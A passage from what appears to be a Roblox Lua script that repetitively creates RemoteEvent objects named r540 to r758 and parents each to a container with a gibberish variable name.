r540.Name = "r540"
r540.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r541 = Instance.new("RemoteEvent")
r541.Name = "r541"
r541.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r542 = Instance.new("RemoteEvent")
r542.Name = "r542"
r542.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r543 = Instance.new("RemoteEvent")
r543.Name = "r543"
r543.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r544 = Instance.new("RemoteEvent")
r544.Name = "r544"
r544.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r545 = Instance.new("RemoteEvent")
r545.Name = "r545"
r545.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r546 = Instance.new("RemoteEvent")
r546.Name = "r546"
r546.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r547 = Instance.new("RemoteEvent")
r547.Name = "r547"
r547.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r548 = Instance.new("RemoteEvent")
r548.Name = "r548"
r548.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r549 = Instance.new("RemoteEvent")
r549.Name = "r549"
r549.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r55 = Instance.new("RemoteEvent")
r55.Name = "r55"
r55.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r550 = Instance.new("RemoteEvent")
r550.Name = "r550"
r550.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r551 = Instance.new("RemoteEvent")
r551.Name = "r551"
r551.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r552 = Instance.new("RemoteEvent")
r552.Name = "r552"
r552.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r553 = Instance.new("RemoteEvent")
r553.Name = "r553"
r553.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r554 = Instance.new("RemoteEvent")
r554.Name = "r554"
r554.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r555 = Instance.new("RemoteEvent")
r555.Name = "r555"
r555.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r556 = Instance.new("RemoteEvent")
r556.Name = "r556"
r556.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r557 = Instance.new("RemoteEvent")
r557.Name = "r557"
r557.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r558 = Instance.new("RemoteEvent")
r558.Name = "r558"
r558.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r559 = Instance.new("RemoteEvent")
r559.Name = "r559"
r559.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r56 = Instance.new("RemoteEvent")
r56.Name = "r56"
r56.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r560 = Instance.new("RemoteEvent")
r560.Name = "r560"
r560.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r561 = Instance.new("RemoteEvent")
r561.Name = "r561"
r561.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r562 = Instance.new("RemoteEvent")
r562.Name = "r562"
r562.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r563 = Instance.new("RemoteEvent")
r563.Name = "r563"
r563.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r564 = Instance.new("RemoteEvent")
r564.Name = "r564"
r564.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r565 = Instance.new("RemoteEvent")
r565.Name = "r565"
r565.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r566 = Instance.new("RemoteEvent")
r566.Name = "r566"
r566.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r567 = Instance.new("RemoteEvent")
r567.Name = "r567"
r567.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r568 = Instance.new("RemoteEvent")
r568.Name = "r568"
r568.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r569 = Instance.new("RemoteEvent")
r569.Name = "r569"
r569.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r57 = Instance.new("RemoteEvent")
r57.Name = "r57"
r57.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r570 = Instance.new("RemoteEvent")
r570.Name = "r570"
r570.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r571 = Instance.new("RemoteEvent")
r571.Name = "r571"
r571.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r572 = Instance.new("RemoteEvent")
r572.Name = "r572"
r572.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r573 = Instance.new("RemoteEvent")
r573.Name = "r573"
r573.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r574 = Instance.new("RemoteEvent")
r574.Name = "r574"
r574.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r575 = Instance.new("RemoteEvent")
r575.Name = "r575"
r575.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r576 = Instance.new("RemoteEvent")
r576.Name = "r576"
r576.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r577 = Instance.new("RemoteEvent")
r577.Name = "r577"
r577.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r578 = Instance.new("RemoteEvent")
r578.Name = "r578"
r578.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r579 = Instance.new("RemoteEvent")
r579.Name = "r579"
r579.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r58 = Instance.new("RemoteEvent")
r58.Name = "r58"
r58.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r580 = Instance.new("RemoteEvent")
r580.Name = "r580"
r580.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r581 = Instance.new("RemoteEvent")
r581.Name = "r581"
r581.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r582 = Instance.new("RemoteEvent")
r582.Name = "r582"
r582.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r583 = Instance.new("RemoteEvent")
r583.Name = "r583"
r583.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r584 = Instance.new("RemoteEvent")
r584.Name = "r584"
r584.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r585 = Instance.new("RemoteEvent")
r585.Name = "r585"
r585.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r586 = Instance.new("RemoteEvent")
r586.Name = "r586"
r586.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r587 = Instance.new("RemoteEvent")
r587.Name = "r587"
r587.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r588 = Instance.new("RemoteEvent")
r588.Name = "r588"
r588.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r589 = Instance.new("RemoteEvent")
r589.Name = "r589"
r589.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r59 = Instance.new("RemoteEvent")
r59.Name = "r59"
r59.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r590 = Instance.new("RemoteEvent")
r590.Name = "r590"
r590.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r591 = Instance.new("RemoteEvent")
r591.Name = "r591"
r591.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r592 = Instance.new("RemoteEvent")
r592.Name = "r592"
r592.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r593 = Instance.new("RemoteEvent")
r593.Name = "r593"
r593.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r594 = Instance.new("RemoteEvent")
r594.Name = "r594"
r594.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r595 = Instance.new("RemoteEvent")
r595.Name = "r595"
r595.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r596 = Instance.new("RemoteEvent")
r596.Name = "r596"
r596.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r597 = Instance.new("RemoteEvent")
r597.Name = "r597"
r597.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r598 = Instance.new("RemoteEvent")
r598.Name = "r598"
r598.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r599 = Instance.new("RemoteEvent")
r599.Name = "r599"
r599.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r6 = Instance.new("RemoteEvent")
r6.Name = "r6"
r6.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r60 = Instance.new("RemoteEvent")
r60.Name = "r60"
r60.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r600 = Instance.new("RemoteEvent")
r600.Name = "r600"
r600.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r601 = Instance.new("RemoteEvent")
r601.Name = "r601"
r601.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r602 = Instance.new("RemoteEvent")
r602.Name = "r602"
r602.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r603 = Instance.new("RemoteEvent")
r603.Name = "r603"
r603.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r604 = Instance.new("RemoteEvent")
r604.Name = "r604"
r604.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r605 = Instance.new("RemoteEvent")
r605.Name = "r605"
r605.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r606 = Instance.new("RemoteEvent")
r606.Name = "r606"
r606.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r607 = Instance.new("RemoteEvent")
r607.Name = "r607"
r607.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r608 = Instance.new("RemoteEvent")
r608.Name = "r608"
r608.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r609 = Instance.new("RemoteEvent")
r609.Name = "r609"
r609.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r61 = Instance.new("RemoteEvent")
r61.Name = "r61"
r61.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r610 = Instance.new("RemoteEvent")
r610.Name = "r610"
r610.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r611 = Instance.new("RemoteEvent")
r611.Name = "r611"
r611.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r612 = Instance.new("RemoteEvent")
r612.Name = "r612"
r612.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r613 = Instance.new("RemoteEvent")
r613.Name = "r613"
r613.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r614 = Instance.new("RemoteEvent")
r614.Name = "r614"
r614.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r615 = Instance.new("RemoteEvent")
r615.Name = "r615"
r615.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r616 = Instance.new("RemoteEvent")
r616.Name = "r616"
r616.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r617 = Instance.new("RemoteEvent")
r617.Name = "r617"
r617.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r618 = Instance.new("RemoteEvent")
r618.Name = "r618"
r618.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r619 = Instance.new("RemoteEvent")
r619.Name = "r619"
r619.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r62 = Instance.new("RemoteEvent")
r62.Name = "r62"
r62.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r620 = Instance.new("RemoteEvent")
r620.Name = "r620"
r620.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r621 = Instance.new("RemoteEvent")
r621.Name = "r621"
r621.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r622 = Instance.new("RemoteEvent")
r622.Name = "r622"
r622.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r623 = Instance.new("RemoteEvent")
r623.Name = "r623"
r623.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r624 = Instance.new("RemoteEvent")
r624.Name = "r624"
r624.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r625 = Instance.new("RemoteEvent")
r625.Name = "r625"
r625.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r626 = Instance.new("RemoteEvent")
r626.Name = "r626"
r626.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r627 = Instance.new("RemoteEvent")
r627.Name = "r627"
r627.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r628 = Instance.new("RemoteEvent")
r628.Name = "r628"
r628.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r629 = Instance.new("RemoteEvent")
r629.Name = "r629"
r629.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r63 = Instance.new("RemoteEvent")
r63.Name = "r63"
r63.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r630 = Instance.new("RemoteEvent")
r630.Name = "r630"
r630.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r631 = Instance.new("RemoteEvent")
r631.Name = "r631"
r631.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r632 = Instance.new("RemoteEvent")
r632.Name = "r632"
r632.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r633 = Instance.new("RemoteEvent")
r633.Name = "r633"
r633.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r634 = Instance.new("RemoteEvent")
r634.Name = "r634"
r634.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r635 = Instance.new("RemoteEvent")
r635.Name = "r635"
r635.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r636 = Instance.new("RemoteEvent")
r636.Name = "r636"
r636.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r637 = Instance.new("RemoteEvent")
r637.Name = "r637"
r637.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r638 = Instance.new("RemoteEvent")
r638.Name = "r638"
r638.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r639 = Instance.new("RemoteEvent")
r639.Name = "r639"
r639.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r64 = Instance.new("RemoteEvent")
r64.Name = "r64"
r64.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r640 = Instance.new("RemoteEvent")
r640.Name = "r640"
r640.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r641 = Instance.new("RemoteEvent")
r641.Name = "r641"
r641.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r642 = Instance.new("RemoteEvent")
r642.Name = "r642"
r642.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r643 = Instance.new("RemoteEvent")
r643.Name = "r643"
r643.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r644 = Instance.new("RemoteEvent")
r644.Name = "r644"
r644.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r645 = Instance.new("RemoteEvent")
r645.Name = "r645"
r645.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r646 = Instance.new("RemoteEvent")
r646.Name = "r646"
r646.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r647 = Instance.new("RemoteEvent")
r647.Name = "r647"
r647.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r648 = Instance.new("RemoteEvent")
r648.Name = "r648"
r648.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r649 = Instance.new("RemoteEvent")
r649.Name = "r649"
r649.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r65 = Instance.new("RemoteEvent")
r65.Name = "r65"
r65.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r650 = Instance.new("RemoteEvent")
r650.Name = "r650"
r650.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r651 = Instance.new("RemoteEvent")
r651.Name = "r651"
r651.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r652 = Instance.new("RemoteEvent")
r652.Name = "r652"
r652.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r653 = Instance.new("RemoteEvent")
r653.Name = "r653"
r653.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r654 = Instance.new("RemoteEvent")
r654.Name = "r654"
r654.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r655 = Instance.new("RemoteEvent")
r655.Name = "r655"
r655.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r656 = Instance.new("RemoteEvent")
r656.Name = "r656"
r656.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r657 = Instance.new("RemoteEvent")
r657.Name = "r657"
r657.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r658 = Instance.new("RemoteEvent")
r658.Name = "r658"
r658.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r659 = Instance.new("RemoteEvent")
r659.Name = "r659"
r659.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r66 = Instance.new("RemoteEvent")
r66.Name = "r66"
r66.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r660 = Instance.new("RemoteEvent")
r660.Name = "r660"
r660.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r661 = Instance.new("RemoteEvent")
r661.Name = "r661"
r661.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r662 = Instance.new("RemoteEvent")
r662.Name = "r662"
r662.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r663 = Instance.new("RemoteEvent")
r663.Name = "r663"
r663.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r664 = Instance.new("RemoteEvent")
r664.Name = "r664"
r664.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r665 = Instance.new("RemoteEvent")
r665.Name = "r665"
r665.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r666 = Instance.new("RemoteEvent")
r666.Name = "r666"
r666.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r667 = Instance.new("RemoteEvent")
r667.Name = "r667"
r667.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r668 = Instance.new("RemoteEvent")
r668.Name = "r668"
r668.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r669 = Instance.new("RemoteEvent")
r669.Name = "r669"
r669.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r67 = Instance.new("RemoteEvent")
r67.Name = "r67"
r67.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r670 = Instance.new("RemoteEvent")
r670.Name = "r670"
r670.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r671 = Instance.new("RemoteEvent")
r671.Name = "r671"
r671.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r672 = Instance.new("RemoteEvent")
r672.Name = "r672"
r672.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r673 = Instance.new("RemoteEvent")
r673.Name = "r673"
r673.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r674 = Instance.new("RemoteEvent")
r674.Name = "r674"
r674.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r675 = Instance.new("RemoteEvent")
r675.Name = "r675"
r675.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r676 = Instance.new("RemoteEvent")
r676.Name = "r676"
r676.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r677 = Instance.new("RemoteEvent")
r677.Name = "r677"
r677.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r678 = Instance.new("RemoteEvent")
r678.Name = "r678"
r678.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r679 = Instance.new("RemoteEvent")
r679.Name = "r679"
r679.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r68 = Instance.new("RemoteEvent")
r68.Name = "r68"
r68.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r680 = Instance.new("RemoteEvent")
r680.Name = "r680"
r680.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r681 = Instance.new("RemoteEvent")
r681.Name = "r681"
r681.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r682 = Instance.new("RemoteEvent")
r682.Name = "r682"
r682.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r683 = Instance.new("RemoteEvent")
r683.Name = "r683"
r683.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r684 = Instance.new("RemoteEvent")
r684.Name = "r684"
r684.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r685 = Instance.new("RemoteEvent")
r685.Name = "r685"
r685.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r686 = Instance.new("RemoteEvent")
r686.Name = "r686"
r686.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r687 = Instance.new("RemoteEvent")
r687.Name = "r687"
r687.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r688 = Instance.new("RemoteEvent")
r688.Name = "r688"
r688.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r689 = Instance.new("RemoteEvent")
r689.Name = "r689"
r689.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r69 = Instance.new("RemoteEvent")
r69.Name = "r69"
r69.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r690 = Instance.new("RemoteEvent")
r690.Name = "r690"
r690.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r691 = Instance.new("RemoteEvent")
r691.Name = "r691"
r691.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r692 = Instance.new("RemoteEvent")
r692.Name = "r692"
r692.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r693 = Instance.new("RemoteEvent")
r693.Name = "r693"
r693.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r694 = Instance.new("RemoteEvent")
r694.Name = "r694"
r694.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r695 = Instance.new("RemoteEvent")
r695.Name = "r695"
r695.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r696 = Instance.new("RemoteEvent")
r696.Name = "r696"
r696.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r697 = Instance.new("RemoteEvent")
r697.Name = "r697"
r697.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r698 = Instance.new("RemoteEvent")
r698.Name = "r698"
r698.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r699 = Instance.new("RemoteEvent")
r699.Name = "r699"
r699.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r7 = Instance.new("RemoteEvent")
r7.Name = "r7"
r7.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r70 = Instance.new("RemoteEvent")
r70.Name = "r70"
r70.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r700 = Instance.new("RemoteEvent")
r700.Name = "r700"
r700.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r701 = Instance.new("RemoteEvent")
r701.Name = "r701"
r701.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r702 = Instance.new("RemoteEvent")
r702.Name = "r702"
r702.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r703 = Instance.new("RemoteEvent")
r703.Name = "r703"
r703.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r704 = Instance.new("RemoteEvent")
r704.Name = "r704"
r704.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r705 = Instance.new("RemoteEvent")
r705.Name = "r705"
r705.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r706 = Instance.new("RemoteEvent")
r706.Name = "r706"
r706.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r707 = Instance.new("RemoteEvent")
r707.Name = "r707"
r707.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r708 = Instance.new("RemoteEvent")
r708.Name = "r708"
r708.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r709 = Instance.new("RemoteEvent")
r709.Name = "r709"
r709.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r71 = Instance.new("RemoteEvent")
r71.Name = "r71"
r71.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r710 = Instance.new("RemoteEvent")
r710.Name = "r710"
r710.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r711 = Instance.new("RemoteEvent")
r711.Name = "r711"
r711.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r712 = Instance.new("RemoteEvent")
r712.Name = "r712"
r712.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r713 = Instance.new("RemoteEvent")
r713.Name = "r713"
r713.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r714 = Instance.new("RemoteEvent")
r714.Name = "r714"
r714.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r715 = Instance.new("RemoteEvent")
r715.Name = "r715"
r715.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r716 = Instance.new("RemoteEvent")
r716.Name = "r716"
r716.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r717 = Instance.new("RemoteEvent")
r717.Name = "r717"
r717.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r718 = Instance.new("RemoteEvent")
r718.Name = "r718"
r718.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r719 = Instance.new("RemoteEvent")
r719.Name = "r719"
r719.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r72 = Instance.new("RemoteEvent")
r72.Name = "r72"
r72.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r720 = Instance.new("RemoteEvent")
r720.Name = "r720"
r720.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r721 = Instance.new("RemoteEvent")
r721.Name = "r721"
r721.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r722 = Instance.new("RemoteEvent")
r722.Name = "r722"
r722.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r723 = Instance.new("RemoteEvent")
r723.Name = "r723"
r723.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r724 = Instance.new("RemoteEvent")
r724.Name = "r724"
r724.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r725 = Instance.new("RemoteEvent")
r725.Name = "r725"
r725.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r726 = Instance.new("RemoteEvent")
r726.Name = "r726"
r726.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r727 = Instance.new("RemoteEvent")
r727.Name = "r727"
r727.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r728 = Instance.new("RemoteEvent")
r728.Name = "r728"
r728.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r729 = Instance.new("RemoteEvent")
r729.Name = "r729"
r729.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r73 = Instance.new("RemoteEvent")
r73.Name = "r73"
r73.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r730 = Instance.new("RemoteEvent")
r730.Name = "r730"
r730.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r731 = Instance.new("RemoteEvent")
r731.Name = "r731"
r731.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r732 = Instance.new("RemoteEvent")
r732.Name = "r732"
r732.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r733 = Instance.new("RemoteEvent")
r733.Name = "r733"
r733.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r734 = Instance.new("RemoteEvent")
r734.Name = "r734"
r734.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r735 = Instance.new("RemoteEvent")
r735.Name = "r735"
r735.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r736 = Instance.new("RemoteEvent")
r736.Name = "r736"
r736.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r737 = Instance.new("RemoteEvent")
r737.Name = "r737"
r737.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r738 = Instance.new("RemoteEvent")
r738.Name = "r738"
r738.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r739 = Instance.new("RemoteEvent")
r739.Name = "r739"
r739.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r74 = Instance.new("RemoteEvent")
r74.Name = "r74"
r74.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r740 = Instance.new("RemoteEvent")
r740.Name = "r740"
r740.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r741 = Instance.new("RemoteEvent")
r741.Name = "r741"
r741.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r742 = Instance.new("RemoteEvent")
r742.Name = "r742"
r742.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r743 = Instance.new("RemoteEvent")
r743.Name = "r743"
r743.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r744 = Instance.new("RemoteEvent")
r744.Name = "r744"
r744.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r745 = Instance.new("RemoteEvent")
r745.Name = "r745"
r745.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r746 = Instance.new("RemoteEvent")
r746.Name = "r746"
r746.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r747 = Instance.new("RemoteEvent")
r747.Name = "r747"
r747.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r748 = Instance.new("RemoteEvent")
r748.Name = "r748"
r748.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r749 = Instance.new("RemoteEvent")
r749.Name = "r749"
r749.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r75 = Instance.new("RemoteEvent")
r75.Name = "r75"
r75.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r750 = Instance.new("RemoteEvent")
r750.Name = "r750"
r750.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r751 = Instance.new("RemoteEvent")
r751.Name = "r751"
r751.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r752 = Instance.new("RemoteEvent")
r752.Name = "r752"
r752.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r753 = Instance.new("RemoteEvent")
r753.Name = "r753"
r753.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r754 = Instance.new("RemoteEvent")
r754.Name = "r754"
r754.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r755 = Instance.new("RemoteEvent")
r755.Name = "r755"
r755.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r756 = Instance.new("RemoteEvent")
r756.Name = "r756"
r756.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r757 = Instance.new("RemoteEvent")
r757.Name = "r757"
r757.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r758 = Instance.new("RemoteEvent")
r758.Name = "r758"
r758.Parent = euwifoqewuiqocujiroidjwifcoqwiro

